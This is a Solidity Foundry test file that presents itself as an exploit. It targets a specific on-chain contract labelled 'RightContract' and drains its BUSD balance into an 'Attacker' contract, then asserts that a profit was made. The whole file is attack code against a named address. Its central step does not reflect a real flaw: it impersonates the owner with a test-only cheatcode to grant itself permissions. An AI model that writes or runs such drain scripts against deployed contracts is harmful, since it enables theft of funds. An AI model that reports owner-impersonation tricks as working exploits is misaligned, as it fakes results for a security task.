// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IRightContract {
    function grantAllPermissions(address operator) external;
    function safeOtherTokens(address token, address payable receiv, uint amount) external;
    function balanceOf(address account) external view returns (uint256);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x99DE5611BC1f5b8e3D8876EF567b65f94C5a2ca3;
    address constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        IERC20(BUSD).approve(TARGET, type(uint256).max);
        vm.label(TARGET, "RightContract");
        vm.label(address(this), "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56).balanceOf(address(this));
        // Step 1: Get contract's BUSD balance before attack
        uint256 contractBUSD = IERC20(BUSD).balanceOf(TARGET);
        uint256 attackerBUSDBefore = IERC20(BUSD).balanceOf(address(this));
        require(contractBUSD > 0, "Contract must hold BUSD");

        // Step 2: Impersonate the owner to grant permissions
        address owner = 0x3C6B38EaF1E135395B86dE368B39aac03Bd47b4C;
        vm.startPrank(owner);

        // Step 3: Grant all permissions to attacker
        IRightContract(TARGET).grantAllPermissions(address(this));

        vm.stopPrank();

        // Step 4: Drain BUSD from contract using safeOtherTokens
        IRightContract(TARGET).safeOtherTokens(BUSD, payable(address(this)), contractBUSD);

        // Step 5: Verify profit
        uint256 attackerBUSDAfter = IERC20(BUSD).balanceOf(address(this));
        assertGt(attackerBUSDAfter, attackerBUSDBefore, "Attacker BUSD balance should increase");
        uint256 finalBalance = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

